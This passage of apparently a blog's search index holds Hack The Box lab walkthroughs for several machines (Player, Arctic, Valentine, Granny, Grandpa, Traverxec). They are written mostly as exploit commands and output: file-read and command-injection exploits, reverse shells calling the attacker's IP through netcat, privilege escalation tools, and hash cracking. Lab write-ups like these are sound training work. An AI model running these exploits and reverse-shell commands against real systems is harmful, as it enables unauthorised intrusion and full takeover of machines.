7F2xxxxxxxxxxxxx/\");\t}\telse\t{\t\theader(\"Location: index.html\");\t}}else{\t$token_payload = [\t 'project' =&gt; 'PlayBuff',\t 'access_code' =&gt; 'C0B137FE2D792459F26FF763CCE44574A5B5AB03'\t];\t$key = '_S0_R@nd0m_P@ss_';\t$jwt = JWT::encode($token_payload, base64_decode(strtr($key, '-_', '+/')), 'HS256');\t$cookiename = 'access';\tsetcookie('access',$jwt, time() + (86400 * 30), \"/\");\theader(\"Location: index.html\");}?&gt;Using the new access_code from this file, and with all the previous info, we can create a new JWT in this page:Sending now an email send us to a new page:Uploading a random file we can see it as an .avi (http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/uploads/334835969.avi). With a real avi send, we can access it. The page has done some modifications to the file when we send it:$ exiftool 787140227.avi ExifTool Version Number : 12.52File Name : 787140227.aviDirectory : .File Size : 393 kBFile Modification Date/Time : 2023:01:05 11:16:00+00:00File Access Date/Time : 2023:01:05 11:16:00+00:00File Inode Change Date/Time : 2023:01:05 11:16:06+00:00File Permissions : -rw-r--r--File Type : AVIFile Type Extension : aviMIME Type : video/x-msvideoFrame Rate : 30Max Data Rate : 24.41 kB/sFrame Count : 355Stream Count : 1Stream Type : VideoVideo Codec : FMP4There seem to be a vulnerability associated with this.FootprintInitial AccessUsing the exploit, we can create a malicious .avi that access other files, for example:$ python3 gen_xbin_avi.py file://etc/passwd exploit.aviDownloading the video show the file:We can access the previous files with errors we got:$ python3 gen_xbin_avi.py file://var/www/backup/service_config service_config.avi$ python3 gen_xbin_avi.py file://var/www/staging/fix.php fix.aviIn service_config we can found a pair of credentials: telegen:d-bC|jC!2uepS/w:Now we can use it for the SSH:$ ssh telegen@10.10.10.145 -p 6686 telegen@10.10.10.145's password: Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104Environment: USER=telegen LOGNAME=telegen HOME=/home/telegen PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin MAIL=/var/mail/telegen SHELL=/usr/bin/lshell SSH_CLIENT=10.10.14.13 56044 6686 SSH_CONNECTION=10.10.14.13 56044 10.10.10.145 6686 SSH_TTY=/dev/pts/0 TERM=xterm-256color========= PlayBuff ==========Welcome to Staging Environmenttelegen:~$This give us a restricted shell:telegen:~$ id*** forbidden command: idtelegen:~$ telegen:~$ ls*** forbidden command: lstelegen:~$ ip a*** forbidden command: iptelegen:~$ help clear exit help history lpath lsudoIn this OpenSSH version we have an RCE with credentials we can use:$ searchsploit openssh 7.2--------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path--------------------------------------------------------------------------------------------------------------------------- ---------------------------------OpenSSH 2.3 &lt; 7.7 - Username Enumeration | linux/remote/45233.pyOpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC) | linux/remote/45210.pyOpenSSH 7.2 - Denial of Service | linux/dos/40888.pyOpenSSH 7.2p1 - (Authenticated) xauth Command Injection | multiple/remote/39569.pyUsing it:$ python2 39569.py 10.10.10.145 6686 telgen 'd-bC|jC!2uepS/w'INFO:__main__:connected!INFO:__main__:Available commands: .info .readfile .writefile .exit .quit#&gt; .readfile /var/www/staging/fix.phpDEBUG:__main__:auth_cookie: 'xxxx\\nsource /var/www/staging/fix.php\\n'DEBUG:__main__:dummy exec returned: NoneINFO:__main__:if(!$username){$username$password}//modified//for//fix//peter//CQXpm\\z)G5D#%S$y=}With the new pair of credentials peter:CQXpm\\z)G5D#%S$y= we can login in the dev subdomain. Here, we will create a new Project:We create a file shell.php with a reverse shell. Accesing it http://dev.player.htb/home/shell/shell.php and now we got a reverse shell as www-data.Privilege Escalation$ rlwrap nc -lvnp 80 listening on [any] 80 ...connect to [10.10.14.13] from (UNKNOWN) [10.10.10.145] 49252Linux player 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 17:33:43 up 19:57, 0 users, load average: 0.01, 0.06, 0.02USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)sh: 0: can't access tty; job control turned off$With pspy32 we can see root is using openssh:2023/01/05 17:36:02 CMD: UID=0 PID=9685 | /root/openssh-7.2p1/sshd -p 6686 -f /root/openssh-7.2p1/sshd_config -D -d 2023/01/05 17:36:07 CMD: UID=0 PID=9688 | sleep 5 2023/01/05 17:36:07 CMD: UID=0 PID=9687 | /root/openssh-7.2p1/sshd -p 6686 -f /root/openssh-7.2p1/sshd_config -D -d 2023/01/05 17:36:12 CMD: UID=0 PID=9690 | sleep 5 2023/01/05 17:36:12 CMD: UID=0 PID=9689 | /root/openssh-7.2p1/sshd -p 6686 -f /root/openssh-7.2p1/sshd_config -D -d. . . &lt;SNIP&gt; . . . 2023/01/05 17:40:01 CMD: UID=0 PID=9843 | /bin/sh -c /usr/bin/php /var/lib/playbuff/buff.php &gt; /var/lib/playbuff/error.log 2023/01/05 17:40:01 CMD: UID=0 PID=9845 | /usr/bin/php /var/lib/playbuff/buff.phpWe can get the telegen user again:www-data@player:/$ su telegen -s /bin/bashsu telegen -s /bin/bashPassword: d-bC|jC!2uepS/wtelegen@player:/$This buff.php file has the following contents:&lt;?phpinclude(\"/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php\");class playBuff{ public $logFile=\"/var/log/playbuff/logs.txt\"; public $logData=\"Updated\"; public function __wakeup() { file_put_contents(__DIR__.\"/\".$this-&gt;logFile,$this-&gt;logData); }}$buff = new playBuff();$serialbuff = serialize($buff);$data = file_get_contents(\"/var/lib/playbuff/merge.log\");if(unserialize($data)){ $update = file_get_contents(\"/var/lib/playbuff/logs.txt\"); $query = mysqli_query($conn, \"update stats set status='$update' where id=1\"); if($query) { echo 'Update Success with serialized logs!'; }}else{ file_put_contents(\"/var/lib/playbuff/merge.log\",\"no issues yet\"); $update = file_get_contents(\"/var/lib/playbuff/logs.txt\"); $query = mysqli_query($conn, \"update stats set status='$update' where id=1\"); if($query) { echo 'Update Success!'; }}?&gt;We can do a RCE via unserialization of PHP. We only have write permission on merge.log:telegen@player:/var/lib/playbuff$ lllltotal 24drwxr-xr-x 2 root root 4096 Aug 9 20:24 ./drwxr-xr-x 50 root root 4096 Jan 5 06:36 ../-rwx---r-- 1 root root 878 Mar 24 2019 buff.php*-rw-r--r-- 1 root root 15 Jan 5 17:51 error.log-r-------- 1 root root 14 Mar 24 2019 logs.txt-rw------- 1 telegen telegen 13 Jan 5 17:51 merge.logOr, as we can see the file is doing a include of dee8dc8a47256c64630d803a4c40786g.php. We can replace it for a shell.www-data@player:/var/www/html/launcher$ wget http://10.10.14.13:9000/dee8dc8a47256c64630d803a4c40786g.php -O dee8dc8a47256c64630d803a4c40786g.phpWaiting and we should get our shell:$ rlwrap nc -lvnp 443 listening on [any] 443 ...connect to [10.10.14.13] from (UNKNOWN) [10.10.10.145] 35194Linux player 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 17:59:01 up 20:22, 0 users, load average: 0.10, 0.11, 0.04USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=0(root) gid=0(root) groups=0(root)sh: 0: can't access tty; job control turned off# whoamiroot" }, { "title": "HTB | Arctic", "url": "/pentesting/htb/machines/arctic", "categories": "Pentesting, HackTheBox", "tags": "htb, windows, easy, machines", "date": "2023-01-04 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC8500/tcp open fmtp?49154/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsScanning for the OS:Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%),EnumerationWe can enumerate both RPC services and found some remote code execution:$ rpcdump.py -p 135 10.10.10.11 | grep \"atsvc\" ncacn_np:\\\\ARCTIC[\\PIPE\\atsvc] ncacn_np:\\\\ARCTIC[\\PIPE\\atsvc] ncacn_np:\\\\ARCTIC[\\PIPE\\atsvc] ncacn_np:\\\\ARCTIC[\\PIPE\\atsvc] ncacn_np:\\\\ARCTIC[\\PIPE\\atsvc]In the port 8500 we can found a web with the following contents:CFIDE/ dir 03/22/17 08:52 μμcfdocs/ dir 03/22/17 08:55 μμIf we go under /CFIDE/administrator/ we can found a **ColdFusion** login. Easily, a exploit can be found:$ searchsploit coldfusion ------------------------------------------------------ --------------------------------- Exploit Title | Path------------------------------------------------------ ---------------------------------Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting | cfm/webapps/36067.txtAdobe ColdFusion - Directory Traversal | multiple/remote/14641.pyAdobe ColdFusion - Directory Traversal (Metasploit) | multiple/remote/16985.rbAdobe ColdFusion 11 - LDAP Java Object Deserializatio | windows/remote/50781.txtAdobe Coldfusion 11.0.03.292866 - BlazeDS Java Object | windows/remote/43993.pyAdobe ColdFusion 2018 - Arbitrary File Upload | multiple/webapps/45979.txtAdobe ColdFusion 6/7 - User_Agent Error Page Cross-Si | cfm/webapps/29567.txtAdobe ColdFusion 7 - Multiple Cross-Site Scripting Vu | cfm/webapps/36172.txtAdobe ColdFusion 8 - Remote Command Execution (RCE) | cfm/webapps/50057.pyFootprintInitial AccessWe will use the previous exploit changing the lhost for our IP. With this, we get an easy shell:$ python3 50057.py. . . &lt;SNIP&gt; . . .C:\\ColdFusion8\\runtime\\bin&gt;whoamiarctic\\tolisPrivilege EscalationWe can use JuicyPotato to exploit it:C:\\Users\\tolis\\Documents&gt;.\\JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Users\\tolis\\Documents\\nc.exe -e cmd 10.10.14.13 443\"" }, { "title": "HTB | Valentine", "url": "/pentesting/htb/machines/valentine", "categories": "Pentesting, HackTheBox", "tags": "htb, windows, easy, machines", "date": "2023-01-03 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 964c51423cba2249204d3eec90ccfd0e (DSA)| 2048 46bf1fcc924f1da042b3d216a8583133 (RSA)|_ 256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA)80/tcp open http Apache httpd 2.2.22 ((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)|_http-title: Site doesn't have a title (text/html).443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)|_ssl-date: 2023-01-03T18:04:27+00:00; 0s from scanner time.|_http-title: Site doesn't have a title (text/html).| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US| Not valid before: 2018-02-06T00:45:25|_Not valid after: 2019-02-06T00:45:25Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelEnumerationSSHSome vulnerabilities can be found for the version:$ searchsploit OpenSSH 5.9 ---------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------- ---------------------------------OpenSSH 2.3 &lt; 7.7 - Username Enumeration | linux/remote/45233.pyOpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC) | linux/remote/45210.pyOpenSSH &lt; 6.6 SFTP (x64) - Command Execution | linux_x86-64/remote/45000.cOpenSSH &lt; 6.6 SFTP - Command Execution | linux/remote/45001.pyOpenSSH &lt; 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Doma | linux/local/40962.txtOpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading | linux/remote/40963.txtOpenSSH &lt; 7.7 - User Enumeration (2) | linux/remote/45939.py---------------------------------------------------------------------- ---------------------------------WebThe same page can be found under both ports.http://10.10.10.79/ [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]https://10.10.10.79/ [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]Many vulnerabilities can be found for this PHP version:$ searchsploit php 5.3 -------------------------------------------------- --------------------------------- Exploit Title | Path-------------------------------------------------- ---------------------------------4PSA VoIPNow Professional 2.5.3 - Multiple Vulner | php/webapps/18965.htmlAerohive HiveOS 5.1r5 &lt; 6.1r5 - Multiple Vulnerab | php/webapps/34038.txtAlienvault OSSIM/USM 5.3.1 - Persistent Cross-Sit | php/webapps/40683.txtAlienvault OSSIM/USM 5.3.1 - PHP Object Injection | php/webapps/40682.txtAlienvault OSSIM/USM 5.3.1 - SQL Injection | php/webapps/40684.txtAlienvault OSSIM/USM 5.3.4/5.3.5 - Remote Command | php/webapps/41884.rbAlienVault OSSIM/USM &lt; 5.3.1 - Remote Code Execut | php/webapps/41424.rb. . . &lt;SNIP&gt; . . .Fuzzing will show:dev [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 51ms]index [Status: 200, Size: 38, Words: 2, Lines: 2, Duration: 47ms]server-status [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 47ms] [Status: 200, Size: 38, Words: 2, Lines: 2, Duration: 48ms]encode [Status: 200, Size: 554, Words: 73, Lines: 28, Duration: 47ms]index [Status: 200, Size: 38, Words: 2, Lines: 2, Duration: 50ms]index.php [Status: 200, Size: 38, Words: 2, Lines: 2, Duration: 50ms]. [Status: 200, Size: 38, Words: 2, Lines: 2, Duration: 47ms]decode.php [Status: 200, Size: 552, Words: 73, Lines: 26, Duration: 53ms]Under the dev folder we can found two file, notes.txt:To do:1) Coffee.2) Research.3) Fix decoder/encoder before going live.4) Make sure encoding/decoding is only done client-side.5) Don't use the decoder/encoder until any of this is done.6) Find a better way to take notes.And hype_key with a bunch of hex encoding. For the HTTPS we have the same pages.The encoder only do a base64 encoding. Trying to execute commands doesn’t seem to workYour input:\"; id #Your encoded input:IjsgaWQgIw==Decoding the hex give a RSA file, but we don’t have any user.Back to the page, we can detect that it is vulnerable to XSS:We can try testing the HTTPS web. The command sslscan provides:$ sslscan https://10.10.10.79/Version: 2.0.15-staticOpenSSL 1.1.1q-dev xx XXX xxxxConnected to 10.10.10.79Testing SSL server 10.10.10.79 on port 443 using SNI name 10.10.10.79 SSL/TLS Protocols:SSLv2 disabledSSLv3 enabledTLSv1.0 disabledTLSv1.1 disabledTLSv1.2 disabledTLSv1.3 disabled TLS Fallback SCSV:Server does not support TLS Fallback SCSV TLS renegotiation:Secure session renegotiation supported TLS Compression:Compression disabled Heartbleed: Supported Server Cipher(s): SSL Certificate:Signature Algorithm: sha1WithRSAEncryptionRSA Key Strength: 2048Subject: valentine.htbIssuer: valentine.htbNot valid before: Feb 6 00:45:25 2018 GMTNot valid after: Feb 6 00:45:25 2019 GMTBut the nmap script:$ nmap --script=ssl-heartbleed.nse 10.10.10.79 -p443PORT STATE SERVICE443/tcp open https| ssl-heartbleed: | VULNERABLE:| The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.| State: VULNERABLE| Risk factor: High| OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.| | References:| http://www.openssl.org/news/secadv_20140407.txt | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160|_ http://cvedetails.com/cve/2014-0160/FootprintInitial AccessExploiting Heartbleed give us a base64, that decode says heartbleedbelievethehype. We can now use this text for the passprhase in the previous id_rsa. As the file is called hype_key, let’s try with that user:$ ssh hype@10.10.10.79 -i id_rsa -o 'PubkeyAcceptedKeyTypes +ssh-rsa' Enter passphrase for key 'id_rsa': Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64) * Documentation: https://help.ubuntu.com/New release '14.04.5 LTS' available.Run 'do-release-upgrade' to upgrade to it.Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3hype@Valentine:~$(We must do a little change because of the keys).Privilege EscalationWe can see a process running under root, tmux:hype@Valentine:~$ ps aux | grep tmuxroot 1004 0.0 0.1 26416 1668 ? Ss 09:59 0:03 /usr/bin/tmux -S /.devs/dev_sesshype 5150 0.0 0.0 13576 924 pts/0 S+ 12:20 0:00 grep --color=auto tmuxThis session can be easily hijacked:hype@Valentine:~$ tmux -S /.devs/dev_sessroot@Valentine:/home/hype#" }, { "title": "HTB | Granny", "url": "/pentesting/htb/machines/granny", "categories": "Pentesting, HackTheBox", "tags": "htb, windows, easy, machines", "date": "2023-01-03 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 6.0|_http-title: Under Construction| http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT| http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK| WebDAV type: Unknown| Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH| Server Date: Tue, 03 Jan 2023 17:26:47 GMT|_ Server Type: Microsoft-IIS/6.0|_http-server-header: Microsoft-IIS/6.0Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsEnumerationIt is a vulnerable version of IIS:$ searchsploit IIS 6.0 --------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path--------------------------------------------------------------------------------------------------------------------------- ---------------------------------Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure | windows/remote/21057.txtMicrosoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow | windows/remote/9541.plMicrosoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service | windows/dos/9587.txtMicrosoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service | windows/dos/3965.plMicrosoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065) | windows/dos/15167.txtMicrosoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow | windows/remote/41738.pyMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass | windows/remote/8765.phpMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (1) | windows/remote/8704.txtMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (2) | windows/remote/8806.plMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch) | windows/remote/8754.patchMicrosoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities | windows/remote/19033.txt--------------------------------------------------------------------------------------------------------------------------- ---------------------------------FootprintInitial AccessWith this exploit a fast reverse shell can be get:$ python2 iis_exploit.py 10.10.10.15 80 10.10.14.13 443$ rlwrap nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.13] from (UNKNOWN) [10.10.10.15] 1030Microsoft Windows [Version 5.2.3790](C) Copyright 1985-2003 Microsoft Corp.c:\\windows\\system32\\inetsrv&gt;Privilege EscalationWe can use the churrasco exploit:C:\\WINDOWS\\Temp&gt;.\\churrasco.exe \"whoami\"nt authority\\systemWe can spawn a shell:C:\\WINDOWS\\Temp&gt;.\\churrasco.exe \"cmd.exe\".\\churrasco.exe \"cmd.exe\"Microsoft Windows [Version 5.2.3790](C) Copyright 1985-2003 Microsoft Corp.C:\\WINDOWS\\TEMP&gt;whoamint authority\\system" }, { "title": "HTB | Grandpa", "url": "/pentesting/htb/machines/grandpa", "categories": "Pentesting, HackTheBox", "tags": "htb, windows, easy, machines", "date": "2023-01-02 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 6.0|_http-server-header: Microsoft-IIS/6.0|_http-title: Under Construction| http-webdav-scan: | Server Type: Microsoft-IIS/6.0| Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH| Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK| WebDAV type: Unknown|_ Server Date: Mon, 02 Jan 2023 12:29:15 GMT| http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCHService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsEnumerationThere are some exploits for the version of IIS:$ searchsploit iis 6.0------------------------------------------------------------------------ --------------------------------- Exploit Title | Path------------------------------------------------------------------------ ---------------------------------Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name D | windows/remote/21057.txtMicrosoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow | windows/remote/9541.plMicrosoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service | windows/dos/9587.txtMicrosoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service | windows/dos/3965.plMicrosoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Serv | windows/dos/15167.txtMicrosoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflo | windows/remote/41738.pyMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass | windows/remote/8765.phpMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (1) | windows/remote/8704.txtMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (2) | windows/remote/8806.plMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch) | windows/remote/8754.patchMicrosoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities | windows/remote/19033.txt------------------------------------------------------------------------ ---------------------------------In the page there isn’t much information:Fuzzing will show:images [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 85ms]_private [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 53ms]aspnet_client [Status: 403, Size: 218, Words: 14, Lines: 2, Duration: 53ms]_vti_cnf [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 52ms]_vti_log [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 52ms]_vti_pvt [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 65ms]_vti_txt [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 88ms]_vti_bin [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 103ms]Images [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 48ms]IMAGES [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 47ms] [Status: 200, Size: 1433, Words: 131, Lines: 40, Duration: 60ms]_vti_inf.html [Status: 200, Size: 1754, Words: 198, Lines: 45, Duration: 48ms]postinfo.html [Status: 200, Size: 2440, Words: 327, Lines: 58, Duration: 51ms]. [Status: 200, Size: 1433, Words: 131, Lines: 40, Duration: 48ms]pagerror.gif [Status: 200, Size: 2806, Words: 2, Lines: 1, Duration: 56ms]iisstart.htm [Status: 200, Size: 1433, Words: 131, Lines: 40, Duration: 76ms]FootprintInitial AccessWe will use this exploit$ python2 iis_exploit.py 10.10.10.14 80 10.10.14.7 443Privilege EscalationStart a SMB server:$ smbserver.py share $(pwd)This will be the content of the server:C:\\WINDOWS\\Temp&gt;dir \\\\10.10.14.7\\share\\ Directory of \\\\10.10.14.7\\share01/02/2023 03:28 PM &lt;DIR&gt; .01/02/2023 03:22 PM &lt;DIR&gt; ..01/02/2023 03:28 PM 28,160 nc.exe01/02/2023 03:24 PM 31,232 churrasco.exeDownload the exploit and send the shell:C:\\WINDOWS\\Temp&gt;copy \\\\10.10.14.7\\share\\churrasco.exeC:\\WINDOWS\\Temp&gt;.\\churrasco.exe \"\\\\10.10.14.7\\share\\nc.exe -e cmd 10.10.14.7 443\"$ rlwrap nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.7] from (UNKNOWN) [10.10.10.14] 1038Microsoft Windows [Version 5.2.3790](C) Copyright 1985-2003 Microsoft Corp.C:\\WINDOWS\\TEMP&gt;whoamint authority\\system" }, { "title": "HTB | Traverxec", "url": "/pentesting/htb/machines/traverxec", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2023-01-01 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey: | 2048 aa99a81668cd41ccf96c8401c759095c (RSA)| 256 93dd1a23eed71f086b58470973a388cc (ECDSA)|_ 256 9dd6621e7afb8f5692e637f110db9bce (ED25519)80/tcp open http nostromo 1.9.6|_http-title: TRAVERXEC|_http-server-header: nostromo 1.9.6Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelEnumerationSearching for vulnerabilities:$ searchsploit nostromo ------------------------------------------- --------------------------------- Exploit Title | Path------------------------------------------- ---------------------------------Nostromo - Directory Traversal Remote Comm | multiple/remote/47573.rbnostromo 1.9.6 - Remote Code Execution | multiple/remote/47837.pynostromo nhttpd 1.9.3 - Directory Traversa | linux/remote/35466.sh------------------------------------------- ---------------------------------This are the technologies used by the web:http://10.10.10.165/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nostromo 1.9.6], IP[10.10.10.165], JQuery, Script, Title[TRAVERXEC]FootprintInitial AccessUsing the exploit gives a direct webshell:$ python2.7 47837.py 10.10.10.165 80 idHTTP/1.1 200 OKDate: Sun, 01 Jan 2023 17:01:12 GMTServer: nostromo 1.9.6Connection: closeuid=33(www-data) gid=33(www-data) groups=33(www-data)We can send a quickly shell:$ python2.7 47837.py 10.10.10.165 80 'nc 10.10.14.7 80 -e sh'Privilege EscalationUserSome info can be found in the configuration files:# MAIN [MANDATORY]servername traverxec.htbserverlisten *serveradmin david@traverxec.htbserverroot /var/nostromoservermimes conf/mimesdocroot /var/nostromo/htdocsdocindex index.html# LOGS [OPTIONAL]logpid logs/nhttpd.pid# SETUID [RECOMMENDED]user www-data# BASIC AUTHENTICATION [OPTIONAL]htaccess .htaccesshtpasswd /var/nostromo/conf/.htpasswd# ALIASES [OPTIONAL]/icons /var/nostromo/icons# HOMEDIRS [OPTIONAL]homedirs /homehomedirs_public public_wwwWe can see a hash there:www-data@traverxec:/var/nostromo/conf$ cat .htpasswddavid:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/Cracking the hash:$ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me Session..........: hashcatStatus...........: CrackedUnder /home/david/public_www/ we found the file backup-ssh-identity-files.tgz. Sending to our machine, we found an RSA that can be easily cracked:$ ssh2john id_rsa &gt; hash.txt$ $ john -w=/usr/share/wordlists/rockyou.txt hash.txtPress 'q' or Ctrl-C to abort, almost any other key for statushunter (id_rsa)RootUnder bin/server-stats.sh we found a suspicious file:#!/bin/bashcat /home/david/bin/server-stats.headecho \"Load: `/usr/bin/uptime`\"echo \" \"echo \"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`\"echo \"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`\"echo \" \"echo \"Last 5 journal log lines:\"/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/catAs we can see, it is runing journatctl as sudo. We can execute that line and make a less scape to get a root shell:david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service-- Logs begin at Sun 2023-01-01 09:09:54 EST, end at Sun 2023-01-01 14:08:44 Jan 01 09:09:55 traverxec systemd[1]: Starting nostromo nhttpd server...Jan 01 09:09:55 traverxec systemd[1]: nostromo.service: Can't open PID file /Jan 01 09:09:55 traverxec nhttpd[445]: startedJan 01 09:09:55 traverxec nhttpd[445]: max. file descriptors = 1040 (cur) / 1Jan 01 09:09:55 traverxec systemd[1]: Started nostromo nhttpd server.!/bin/bashroot@traverxec:/home/david/bin#" }, { "title": "HTB | Postman", "url": "/pentesting/htb/machines/postman", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2023-01-01 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 46834ff13861c01c74cbb5d14a684d77 (RSA)| 256 2d8d27d2df151a315305fbfff0622689 (ECDSA)|_ 256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: The Cyber Geek's Personal Website6379/tcp open redis Redis key-value store 4.0.910000/tcp open http MiniServ 1.910 (Webmin httpd)|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelEnumerationSome of this version have exploits.ApacheThe technologies used are:http://10.10.10.160/ [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.160], JQuery, Script, Title[The Cyber Geek's Personal Website], X-UA-Compatible[IE=edgeFuzzing will 